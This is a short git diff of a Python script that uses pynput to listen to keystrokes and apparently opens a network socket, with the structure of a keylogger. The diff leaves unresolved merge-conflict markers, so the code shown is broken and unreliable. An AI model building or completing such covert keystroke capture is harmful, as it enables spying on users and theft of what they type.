@@ -1,5 +1,3 @@
-#!/usr/bin/env python
-
 import socket
 from pynput import keyboard
 from time import sleep
@@ -25,6 +23,8 @@ def on_press(key):
 	elif key==key.esc:
 		s.close()
 		return False
+    
+    
 def on_release(key):
 	print key
 
@@ -40,7 +40,12 @@ def on_release(key):
 
 
 # Collect events until released
+<<<<<<< HEAD
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    sleep(5)
+=======
 with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
         listener.join()
+>>>>>>> 72458d149afd5835bb518d1675ed06748857bc45
